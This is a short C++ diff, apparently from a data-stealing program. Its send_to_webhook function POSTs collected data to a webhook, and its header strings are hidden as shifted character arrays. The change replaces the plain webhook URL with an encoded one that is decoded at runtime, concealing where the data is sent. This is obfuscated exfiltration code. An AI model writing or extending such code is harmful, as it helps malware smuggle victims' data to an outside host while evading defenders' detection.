@@ -43,5 +43,5 @@ void web::send_to_webhook(std::string data)
 	// application/json
 	const char type_value[] = {100, 109, 115, 105, 108, 96, 100, 113, 108, 108, 113, 44, 109, 112, 114, 107, '\0'};
 
-	cpr::Response r = cpr::Post(cpr::Url{config::webhook}, cpr::Header{{uwu(content_type), uwu(type_value)}}, cpr::Body{data});
+	cpr::Response r = cpr::Post(cpr::Url{hentai ::uwu(config::encoded_webhook)}, cpr::Header{{uwu(content_type), uwu(type_value)}}, cpr::Body{data});
 }
